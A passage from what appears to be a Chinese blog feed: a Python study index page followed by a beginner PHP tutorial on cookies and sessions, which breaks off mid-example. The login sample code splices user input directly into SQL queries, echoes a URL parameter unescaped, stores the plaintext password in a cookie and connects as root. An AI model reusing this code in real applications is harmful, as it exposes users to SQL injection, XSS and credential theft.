        <content type="html"><![CDATA[<p>从今天开始Python的学习吧……ヾ(๑╹◡╹)ﾉ”</p><a id="more"></a><p>本文参考：<br><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">Python3 教程</a>]</font><br><font color="#00B2EE">[<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431658624177ea4f8fcb06bc4d0e8aab2fd7aa65dd95000" target="_blank" rel="noopener">廖雪峰的官方网站Python教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.ituring.com.cn/book/tupubarticle/10626" target="_blank" rel="noopener">Python编程：从入门到实践</a>]</font><br><font color="#00B2EE">[<a href="http://www.pythondoc.com/" target="_blank" rel="noopener">Python 中文学习大本营-Python 3.6.X 官方教程</a>]</font></p><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">Python 基础</font> </center><p>&emsp;<br>&emsp;</p><h3 id="一-基础语法"><font color="#FF6347" face="Comic sans MS">一. 基础语法</font><a href="post/Python-Basics#一-基础语法"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Grammar" target="_blank" rel="noopener">Python-基础语法</a>]</strong></font><br></font></p><br><br><h3 id="二-变量和数据类型"><font color="#FF6347" face="Comic sans MS">二. 变量和数据类型</font><a href="post/Python-Basics#二-变量和数据类型"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Variables-DataTypes" target="_blank" rel="noopener">Python-变量和数据类型</a>]</strong></font><br></font></p><br><br><h3 id="三-运算符"><font color="#FF6347" face="Comic sans MS">三. 运算符</font><a href="post/Python-Basics#三-运算符"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Operators" target="_blank" rel="noopener">Python-运算符</a>]</strong></font><br></font></p><br><br><h3 id="四-条件语句与循环"><font color="#FF6347" face="Comic sans MS">四. 条件语句与循环</font><a href="post/Python-Basics#四-条件语句与循环"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-ConditionalStatements-loops" target="_blank" rel="noopener">Python-条件语句与循环</a>]</strong></font><br></font></p><br><br><h3 id="五-字符编码、字符串、格式化"><font color="#FF6347" face="Comic sans MS">五. 字符编码、字符串、格式化</font><a href="post/Python-Basics#五-字符编码、字符串、格式化"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Coding" target="_blank" rel="noopener">Python-字符编码&amp;字符串&amp;格式化</a>]</strong></font><br></font></p><br><br><h3 id="六-列表、元组、字典、集合"><font color="#FF6347" face="Comic sans MS">六. 列表、元组、字典、集合</font><a href="post/Python-Basics#六-列表、元组、字典、集合"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-list-tuple-dict-set" target="_blank" rel="noopener">Python-列表、元组、字典、集合</a>]</strong></font><br></font></p><br><br><h3 id="七-函数"><font color="#FF6347" face="Comic sans MS">七. 函数</font><a href="post/Python-Basics#七-函数"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Function" target="_blank" rel="noopener">Python-函数</a>]</strong></font><br></font></p><br><br><h3 id="八-生成器与迭代器"><font color="#FF6347" face="Comic sans MS">八. 生成器与迭代器</font><a href="post/Python-Basics#八-生成器与迭代器"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-generator-iterator" target="_blank" rel="noopener">Python-生成器与迭代器</a>]</strong></font><br></font></p><br><br><h3 id="九-模块和包"><font color="#FF6347" face="Comic sans MS">九. 模块和包</font><a href="post/Python-Basics#九-模块和包"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Modules-Packages" target="_blank" rel="noopener">Python-模块和包</a>]</strong></font><br></font></p><br><br><h3 id="十-函数式编程"><font color="#FF6347" face="Comic sans MS">十. 函数式编程</font><a href="post/Python-Basics#十-函数式编程"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FunctionalProgramming" target="_blank" rel="noopener">Python-函数式编程</a>]</strong></font><br></font></p><br><br><h3 id="十一-文件系统"><font color="#FF6347" face="Comic sans MS">十一. 文件系统</font><a href="post/Python-Basics#十一-文件系统"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FileContents" target="_blank" rel="noopener">Python-文件系统</a>]</strong></font><br></font></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-会话管理和控制</title>
      <link href="/post/PHP-SessionManagement/"/>
      <url>/post/PHP-SessionManagement/</url>
      
        <content type="html"><![CDATA[<p>(。・∀・)ノ</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP 会话管理和控制</font></center><p>&emsp;<br>&emsp;</p><h3 id="一-前言"><font color="#FF6347" face="Comic sans MS">一. 前言</font><a href="post/PHP-SessionManagement#一-前言"></a></h3><p>标准的http协议是无状态的，无连接的。<br>？？？什么意思？⊙﹏⊙∥</p><blockquote><p><strong>【无状态】</strong></p><ol><li>协议对于事务处理没有记忆能力【事物处理】【记忆能力】</li><li>对同一个url请求没有上下文关系【上下文关系】</li><li>每次的请求都是独立的，它的执行情况和结果与前面的请求和之后的请求是无直接关系的，它不会受前面的请求应答情况直接影响，也不会直接影响后面的请求应答情况【无直接联系】【受直接影响】</li><li>服务器中没有保存客户端的状态，客户端必须每次带上自己的状态去请求服务器【状态】</li></ol></blockquote><blockquote><p><strong>【无连接】</strong></p><ol><li>每一个访问都是无连接，服务器挨个处理访问队列里的访问，处理完一个就关闭连接，这事儿就完了，然后处理下一个新的</li><li>无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接</li></ol></blockquote><p>&emsp;<br>具体内容以及为什么使用Session和Cookie参考下面博文：<br><font color="#00B2EE">[<a href="https://www.cnblogs.com/bellkosmos/p/5237146.html" target="_blank" rel="noopener">http协议无状态中的 “状态” 到底指的是什么？！</a>]</font></p><p>&emsp;<br>&emsp;</p><h3 id="二-Cookie概述"><font color="#FF6347" face="Comic sans MS">二. Cookie概述</font><a href="post/PHP-SessionManagement#二-Cookie概述"></a></h3><p>什么是Cookie？<br>请参考本站博客<font color="#00B2EE">[<a href="https://directoree.github.io/post/HTTP-User-Agen-Cookie">HTTP协议请求头部的User-Agen和Cookie</a>]</font></p><p>&emsp;<br>&emsp;</p><h3 id="三-PHP中的Cookie"><font color="#FF6347" face="Comic sans MS">三. PHP中的Cookie</font><a href="post/PHP-SessionManagement#三-PHP中的Cookie"></a></h3><p><strong>这节我们通过一个用户首次登陆网站后，再次访问不需要重复输入用户名和密码的例子来学习Cookie。</strong><br><font face="Comic sans MS">php中提供了一个函数来让我们设置cookie，这个函数是：<font color="#FF7F00">bool setcookie()</font>;<br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp" target="_blank" rel="noopener">PHP setcookie() 函数</a>]</font><br>需要注意的是，这个函数每次只能设置Cookie中的一个参数，比如一次只能设置用户名、密码等字段。</font></p><pre class="line-numbers language-php"><code class="language-php">bool <span class="token function">setcookie</span>  <span class="token punctuation">(</span>        string $名字        <span class="token punctuation">[</span><span class="token punctuation">,</span> string $值<span class="token punctuation">]</span>        <span class="token punctuation">[</span><span class="token punctuation">,</span> int $过期时间  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">]</span>        <span class="token punctuation">[</span><span class="token punctuation">,</span> string $路径<span class="token punctuation">]</span>        <span class="token punctuation">[</span><span class="token punctuation">,</span> string $域名<span class="token punctuation">]</span>        <span class="token punctuation">[</span><span class="token punctuation">,</span> bool $安全  <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">]</span>        <span class="token punctuation">[</span><span class="token punctuation">,</span> bool <span class="token variable">$http</span>只读  <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">]</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">$名字</td><td align="left">必需。规定 cookie 的名称。</td></tr><tr><td align="center">$值</td><td align="left">可选。规定 cookie 的值。</td></tr><tr><td align="center">$有效期</td><td align="left">可选。规定 cookie 的有效期。</td></tr><tr><td align="center">$路径</td><td align="left">可选。规定 cookie 的服务器路径。</td></tr><tr><td align="center">$域名</td><td align="left">可选。规定 cookie 的域名。</td></tr><tr><td align="center">$安全</td><td align="left">可选。规定是否通过安全的 HTTPS 连接来传输 cookie。</td></tr><tr><td align="center">$http只读</td><td align="left">可选。如果true，那么js就无法读取改cookie，增加安全性。</td></tr></tbody></table></div></div><blockquote><p>1.一般来说，我们其实用不到上面那么多参数，对于这个函数，我们一般这么用：<font color="#FF7F00"><strong>setcookie(cookie名,cookie值,cookie有效期)</strong></font>;<br>2.没错，就那么3个。如此一来，我们就可以在服务端通过$_COOKIE[‘name’] 来读取cookie了。</p></blockquote><p>&emsp;<br>&emsp;<br><strong>以下是示例：</strong></p><ol><li>我们将文件名命名为：cookie.php。</li><li>我们来模拟我们在互联网上见到最常见的例子：输入用户名和密码，登陆成功的过程。</li><li>我们来建一个数据库login,其中有表user,有username和password这两个字段。</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//第一次登陆的时候，通过用户输入的信息来确认用户</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$userName</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//从db获取用户信息</span>    <span class="token comment" spellcheck="true">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where `username` = '$userName' "</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//密码验证通过，设置cookies，把用户名和密码保存在客户端</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置时效一个月,一个月后这个cookie失效</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//最后跳转到登录后的欢迎页面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: welcome.php'</span> <span class="token punctuation">.</span> <span class="token string">"?username=$userName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//再次访问的时候通过cookie来识别用户</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$userName</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//从db获取用户信息</span>    <span class="token comment" spellcheck="true">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"select * from user where `username` =  '$userName' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//验证通过后跳转到登录后的欢迎页面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: welcome.php'</span> <span class="token punctuation">.</span> <span class="token string">"?username=$userName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>        用户名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>        密  码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>跳转到的welcome.php代码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>   welcome<span class="token punctuation">,</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$user</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><blockquote><ol><li>这样，当我第一次访问cookie.php的时候，我需要输入用户名和密码，输入完毕后跳转到了welcome.php。然后我关闭浏览器，再次打开cookie.php，这次没有要求我输入用户信息，而是直接跳转到了welcome.php,因为之前我们存的cookie信息被浏览器自动发送到了服务端,服务端做完处理直接跳转到了welcome.php,服务器认识我们了！知道我是之前那个登陆过的用户，这样我们就通过cookie技术让无状态的HTTP协议保持了状态。<br>照着这个做一遍，我相信你会用cookie了。</li><li>只不过！！！只不过！！！只不过！！！重要的事要说3遍，<font color="#FF7F00"><strong>我们一般是不会把用户名和密码放到cookie中的，因为这并不安全，容易泄露自己的信息，请不要把重要的信息放到cookie中</strong></font>。我们这个只是一个学习cookie的例子。</li></ol></blockquote><p>&emsp;<br>&emsp;</p><h3 id="四-PHP中使用session"><font color="#FF6347" face="Comic sans MS">四. PHP中使用session</font><a href="post/PHP-SessionManagement#四-PHP中使用session"></a></h3><p>什么是session以及一些使用方法?可参考博文：<br><font color="#00B2EE">[<a href="http://www.cnblogs.com/lxwphp/p/9237312.html" target="_blank" rel="noopener">php中Session使用方法详解</a>]</font><br><font color="#00B2EE">[<a href="https://www.cnblogs.com/mike1314/p/6985457.html" target="_blank" rel="noopener">PHP会话机制—session的基本使用</a>]</font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_sessions.asp" target="_blank" rel="noopener">W3school PHP Sessions</a>]</font></p><p>&emsp;</p><ol><li>注意：session_start()函数之前不能有任何输出,session_start() 函数必须位于 <code>&lt;html&gt;</code> 标签之前：<br><code>&lt;?php session_start(); ?&gt;</code><br><code>&lt;\html&gt;</code><br><code>&lt;body&gt;</code><br><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code></li><li>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 Session以数组的形式使用，如：$_SESSION[‘session名’]</li><li><strong>注册一个会话变量和读取Session</strong></li><li><font color="#FF7F00"><strong>在PHP中使用Session变量，除了要启动之外，还要经过注册的过程</strong></font>。注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION<font color="#FF7F00"><strong>关联数组</strong></font>中的键名具有和PHP中普通变量相同的命名规则。</li></ol><p>&emsp;</p><h4 id="4-1-开启session"><font color="#3CB371" face="Comic sans MS">4.1 开启session</font><a href="post/PHP-SessionManagement#4-1-开启session"></a></h4><p><strong>使用函数：</strong><font color="#00B2EE"><strong>bool session_start()</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp" target="_blank" rel="noopener">PHP setcookie(void) 函数</a>]</font></p><p>首先我们要开启session，那么第一个要学习的函数就是<br>bool session_start()了，这个函数没有参数。在php文件的开始使用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;</p><h4 id="4-2-注册-添加session数据"><font color="#3CB371" face="Comic sans MS">4.2 (注册)添加session数据</font><a href="post/PHP-SessionManagement#4-2-注册-添加session数据"></a></h4><p>开启会话之后，那么在接下来的处理中，我们就可以使用$_SESSION变量来存取信息了。我们要知道的是$_SESSION变量是个数组。当我们要把信息存入session的时候应该这么写：</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'wang'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;</p><h4 id="4-3-读取session数据"><font color="#3CB371" face="Comic sans MS">4.3 读取session数据</font><a href="post/PHP-SessionManagement#4-3-读取session数据"></a></h4><p>读取很简单，就像我们使用数组一样，如下：</p><pre class="line-numbers language-php"><code class="language-php">   <span class="token variable">$userName</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userName'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然也可以 $_SESSION[‘userName’] 来用。和<font color="red"><strong>数组一样的使用</strong></font>。</p><p>&emsp;</p><h4 id="4-4-销毁session数据"><font color="#3CB371" face="Comic sans MS">4.4 销毁session数据</font><a href="post/PHP-SessionManagement#4-4-销毁session数据"></a></h4><p>我们可以使用很多种方式来销毁session数据。<br><font color="#00B2EE"><strong>a) unset函数</strong></font><br>我们通过使用类似<br><font color="#00B2EE"></font></p><pre class="line-numbers language-php"><code class="language-php">   <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'XXX'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来销毁session中的 XXX 变量。</p><blockquote><p><font color="#FF7F00"><strong>请不要！请不要！请不要unset($_SESSION),会导致后续无法使用$_SESSION这个变量！！！</strong></font></p></blockquote><p>&emsp;<br><font color="#00B2EE"><strong>b) 空数组赋值给session变量</strong></font></p><pre class="line-numbers language-php"><code class="language-php">   $\<span class="token package">_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>之前我们说过$_SESSOIN变量是个数组，那么空数组赋值的话也是相当于将当前会话的$_SESSION变量中的值销毁。</p></blockquote><p>&emsp;<br><font color="#00B2EE"><strong>c) session_destory() 函数</strong></font><br><strong>这个函数会销毁当前会话中的全部数据，并结束当前会话。但是不会重置当前会话所关联的全局变量， 也不会重置会话 cookie。</strong></p><p><font color="#00B2EE"></font></p><p>&emsp;</p><h4 id="4-5-session的扩展"><font color="#3CB371" face="Comic sans MS">4.5 session的扩展</font><a href="post/PHP-SessionManagement#4-5-session的扩展"></a></h4><p>我们可以使用很多种方式来销毁session数据。<br>默认session存储在哪里?<br>&emsp;<br>1.在<code>php.ini</code>配置文件中有这么一行 <code>session.save_handler = files</code>,<br>files说明了php默认的是用文件读写的方式来保存session的。那么在哪个目录呢？继续看。session.save_path = “/tmp”,这一行前面有个 ; ，说明是被注释的，不过即便这样，php默认的session 也是保存在这里的，<code>/tmp</code>目录。</p><p>&emsp;<br>&emsp;</p><h3 id="五-SESSION应用实例"><font color="#FF6347" face="Comic sans MS">五. SESSION应用实例</font><a href="post/PHP-SessionManagement#五-SESSION应用实例"></a></h3><h4 id="5-1-登陆例子"><font color="#3CB371" face="Comic sans MS">5.1 登陆例子</font><a href="post/PHP-SessionManagement#5-1-登陆例子"></a></h4><blockquote><p><strong>2个文件：</strong></p><ol><li><font color="#FF7F00">login.php</font>，用于登陆界面；</li><li><font color="#FF7F00">welcome.php</font>，用于接收从login.php的跳转并设置session。</li></ol></blockquote><p><strong>首先建立数据库信息：</strong><br>新建一个名为 login 的数据库，再建一个 user 表，表的结构有2个字段:<br>username  varchar(20)<br>password  varchar(20)</p><p>&emsp;<br>login.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$userName</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" 